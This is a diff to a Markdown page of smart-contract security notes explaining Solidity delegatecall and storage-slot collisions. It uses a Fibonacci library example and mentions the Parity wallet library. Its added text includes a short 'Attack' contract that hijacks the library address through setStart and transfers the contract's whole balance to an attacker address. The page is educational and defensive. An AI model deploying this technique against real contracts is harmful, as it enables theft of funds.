@@ -2,9 +2,9 @@
 
 State or storage variables (variables that persist over individual transactions) are placed into slots sequentially as they are introduced in the contract. See [Solidity docs](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage) for more details.\
 Solidity stores variables to storage or memory, depending on the type. Uninitialized storage pointers will, by default, point to the initial storage position (0) and can be used to alter the stored value.\
-**`delegatecall`** preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e., storage) of the calling contract.
+**`delegatecall`** preserves contract context. This means that code that is executed via `delegatecall` will act on the state (i.e., storage) of the calling contract.
 
-`Delegatecall` is a special variant of a message call. It is almost identical to a regular message call except the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` remain the same. Essentially, `delegatecall` delegates other contracts to modify the calling contract's storage.
+`Delegatecall` is a special variant of a message call. It is almost identical to a regular message call except the **target address is executed in the context of the calling contrac**t and `msg.sender` and `msg.value` remain the same. **Essentially, `delegatecall` delegates other contracts to modify the calling contract's storage**.
 
 Since `delegatecall` gives so much control over a contract, it's very important to only use this with trusted contracts such as your own. If the target address comes from user input, be sure to verify that it is a trusted contract.
 
@@ -12,7 +12,7 @@ Since `delegatecall` gives so much control over a contract, it's very important 
 
 Consider the library in FibonacciLib.sol, which can generate the Fibonacci sequence and sequences of similar form. ( Note: this code was modified from [https://bit.ly/2MReuii.](https://bit.ly/2MReuii.) )
 
-```
+```solidity
 // library contract - calculates Fibonacci-like numbers
 contract FibonacciLib {
     // initializing the standard Fibonacci sequence
@@ -35,7 +35,7 @@ contract FibonacciLib {
 
 Let us now consider a contract that utilizes this library, shown in FibonacciBalance.sol.
 
-```
+```solidity
 contract FibonacciBalance {
     address public fibonacciLibrary;
     // the current Fibonacci number to withdraw
@@ -63,24 +63,40 @@ contract FibonacciBalance {
 }
 ```
 
+This contract allows a participant to withdraw ether from the contract, with the amount of ether being equal to the Fibonacci number corresponding to the participant's withdrawal order; i.e., the first participant gets 1 ether, the second also gets 1, the third gets 2, the fourth gets 3, the fifth 5, and so on (until the balance of the contract is less than the Fibonacci number being withdrawn).
+
+There are a number of elements in this contract that may require some explanation. Firstly, there is an interesting-looking variable, `fibSig`. This holds the first 4 bytes of the Keccak-256 (SHA-3) hash of the string `'setFibonacci(uint256)'`. This is known as the http://bit.ly/2RmueMP\[function selector] and is put into `calldata` to specify which function of a smart contract will be called. It is used in the `delegatecall` function on line 21 to specify that we wish to run the `fibonacci(uint256)` function. The second argument in `delegatecall` is the parameter we are passing to the function. Secondly, we assume that the address for the `FibonacciLib` library is correctly referenced in the constructor (<\<external\_contract\_referencing>> discusses some potential vulnerabilities relating to this kind of contract reference initialization).
+
+Can you spot any errors in this contract? If one were to deploy this contract, fill it with ether, and call `withdraw`, **it would likely revert**.
+
+You may have noticed that **the state variable `start` is used in both the library and the main calling contract**. In the library contract, `start` is used to specify the beginning of the Fibonacci sequence and is set to `0`, whereas it is set to `3` in the calling contract. You may also have noticed that **the fallback function in the `FibonacciBalance` contract allows all calls to be passed to the library contract**, which allows for the `setStart` function of the library contract to be called. Recalling that we preserve the state of the contract, it may seem that this function would allow you to change the state of the `start` variable in the local `FibonnacciBalance` contract. If so, this would allow one to withdraw more ether, as the resulting `calculatedFibNumber` is dependent on the `start` variable (as seen in the library contract). In actual fact, the `setStart` function does not (and cannot) modify the `start` variable in the `FibonacciBalance` contract. The underlying vulnerability in this contract is significantly worse than just modifying the `start` variable.
+
+Before discussing the actual issue, let's take a quick detour to understand how state variables actually get stored in contracts. **State or storage variables (variables that persist over individual transactions) are placed into **_**slots**_** sequentially as they are introduced in the contract**. (There are some complexities here; consult the [Solidity docs](http://bit.ly/2JslDWf) for a more thorough understanding.)
+
+As an example, let’s look at the library contract. It has two state variables, `start` and `calculatedFibNumber`. The first variable, `start`, is stored in the contract’s storage at `slot[0]` (i.e., the first slot). The second variable, `calculatedFibNumber`, is placed in the next available storage slot, `slot[1]`. The function `setStart` takes an input and sets `start` to whatever the input was. This function therefore sets `slot[0]` to whatever input we provide in the `setStart` function. Similarly, the `setFibonacci` function&#x20;
+
+&#x20;`calculatedFibNumber` to the result of `fibonacci(n)`. Again, this is simply setting storage `slot[1]` to the value of `fibonacci(n)`.
+
+Now let's look at the `FibonacciBalance` contract. Storage `slot[0]` now corresponds to the `fibonacciLibrary` address, and `slot[1]` corresponds to `calculatedFibNumber`. It is in this incorrect mapping that the vulnerability occurs. **`delegatecall`  **_**preserves contract context**_**. This means that code that is executed via `delegatecall` will act on the state (i.e., storage) of the calling contract.**
+
+Now notice that in `withdraw` on line 21 we execute `fibonacciLibrary.delegatecall(fibSig,withdrawalCounter)`. This calls the `setFibonacci` function, which, as we discussed, modifies storage `slot[1]`, which in our current context is `calculatedFibNumber`. This is as expected (i.e., after execution, `calculatedFibNumber` is modified). However, recall that the `start` variable in the `FibonacciLib` contract is located in storage `slot[0]`, which is the `fibonacciLibrary` address in the current contract. This means that the function `fibonacci` will give an unexpected result. This is because it references `start` (`slot[0]`), which in the current calling context is the **`fibonacciLibrary` address (which will often be quite large, when interpreted as a `uint`). Thus it is likely that the `withdraw` function will revert, as it will not contain `uint(fibonacciLibrary)`** amount of ether, which is what `calculatedFibNumber` will return.
+
+Even worse, the `FibonacciBalance` contract allows users to call all of the `fibonacciLibrary` functions via the fallback function at line 26. As we discussed earlier, this includes the `setStart` function. We discussed that this function allows anyone to modify or set storage `slot[0]`. In this case, storage `slot[0]` is the `fibonacciLibrary` address. Therefore, **an attacker could create a malicious contract, convert the address to a `uint`** (this can be done in Python easily using `int('<address>',16)`), and then call `setStart(<attack_contract_address_as_uint>)`. This will change `fibonacciLibrary` to the address of the attack contract. Then, whenever a user calls `withdraw` or the fallback function, the malicious contract will run (which can steal the entire balance of the contract) because we’ve modified the actual address for `fibonacciLibrary`. An example of such an attack contract would be:
+
+```solidity
+contract Attack {
+    uint storageSlot0; // corresponds to fibonacciLibrary
+    uint storageSlot1; // corresponds to calculatedFibNumber
+    // fallback - this will run if a specified function is not found
+    function() public {
+        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
+        // is called we don't send out any ether
+        <attacker_address>.transfer(this.balance); // we take all the ether
+    }
+ }
+```
 
 
-Storage slot\[0] now corresponds to the fibonacciLibrary address, and slot\[1] corresponds to calculatedFibNumber. It is in this incorrect mapping that the vulnerability occurs.\
-recall that the start variable in the FibonacciLib contract is located in storage slot\[0], which is the fibonacciLibrary address in the current contract. This means that the function fibonacci will give an unexpected result. This is because it references start (slot\[0]), which in the current calling context is the fibonacciLibrary address (which will often be quite large, when interpreted as a uint). Thus it is likely that the withdraw function will revert, as it will not contain uint(fibonacciLibrary) amount of ether, which is what calculatedFibNumber will return.
-
-Even worse, the FibonacciBalance contract allows users to call all of the fibonacciLibrary functions via the fallback function at line 26. As we discussed earlier, this includes the setStart function. We discussed that this function allows anyone to modify or set storage slot\[0]. In this case, storage slot\[0] is the fibonacciLibrary address. Therefore, an attacker could create a malicious contract, convert the address to a uint (this can be done in Python easily using int('\<address>',16)), and then call setStart(\<attack\_contract\_address\_as\_uint>). This will change fibonacciLibrary to the address of the attack contract.
-
-contract Attack {\
-&#x20;   uint storageSlot0; // corresponds to fibonacciLibrary\
-&#x20;   uint storageSlot1; // corresponds to calculatedFibNumber
-
-&#x20;   // fallback - this will run if a specified function is not found\
-&#x20;   function() public {\
-&#x20;       storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw\
-&#x20;       // is called we don't send out any ether\
-&#x20;       \<attacker\_address>.transfer(this.balance); // we take all the ether\
-&#x20;   }\
-&#x20;}
 
 ## Preventative Techniques
 
@@ -97,7 +113,7 @@ To add to these references, let’s explore the contracts that were exploited. T
 
 The library contract is as follows:
 
-```
+```solidity
 contract WalletLibrary is WalletEvents {
   ...
   // throw unless the contract is not yet initialized.
